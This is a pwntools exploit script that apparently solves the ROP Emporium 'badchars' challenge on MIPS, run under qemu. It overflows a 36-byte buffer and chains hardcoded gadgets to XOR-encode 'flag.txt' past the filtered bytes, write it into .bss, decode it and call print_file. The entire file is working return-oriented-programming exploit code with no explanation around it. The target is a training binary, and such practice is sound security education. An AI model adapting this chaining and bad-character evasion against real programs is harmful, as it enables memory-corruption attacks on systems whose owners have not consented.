from pwn import *
#io = process("qemu-mipsel -g 1024 -L /usr/mipsel-linux-gnu write4_mipsel",shell=True)
io = process("qemu-mipsel -L /usr/mipsel-linux-gnu badchars_mipsel",shell=True)

copy_gadget = 0x00400930 # lw $t9, 0xc($sp); lw $t0, 8($sp); lw $t1, 4($sp); sw $t1, ($t0); jalr $t9; addi $sp, $sp, 0x10;
xor_and_copy_gadget = 0x00400948 # lw t9, 0xc(sp); lw t0, 8(sp);  lw $t1, 4($sp); lw $t2, ($t1); xor $t0, $t0, $t2; sw $t0, ($t1); jalr $t9; addi $sp, $sp, 0x10;
caller_gadget = 0x00400968 # lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;

print_file_addr = 0x00400ab0
bss = 0x00411000

def copy(address: int,data: bytes):
    chain = p32(copy_gadget) 
    next = copy_gadget
    for i in range(0,len(data),4):
        chunk = data[i:i+4]
        chunk = bytes([b ^ 0x41 for b in chunk])
        if i + 4 >= len(data):
            next = xor_and_copy_gadget
        chunk = int.from_bytes(chunk.ljust(4,b"\x00"), "little")
        chain += p32(0)                # + 0
        chain += p32(chunk)            # + 4      ($t1)
        chain += p32(address + i)      # + 8      ($t0)
        chain += p32(next)             # + 0xc    ($t9)
    return chain


payload = b""
payload += b"A"*36
payload += copy(bss,b"flag.txt")
payload += p32(0) + p32(bss) + p32(0x41414141) + p32(xor_and_copy_gadget)
payload += p32(0) + p32(bss+4) + p32(0x41414141) + p32(caller_gadget)
payload += p32(0) + p32(print_file_addr) + p32(bss)
io.sendline(payload)
io.interactive()
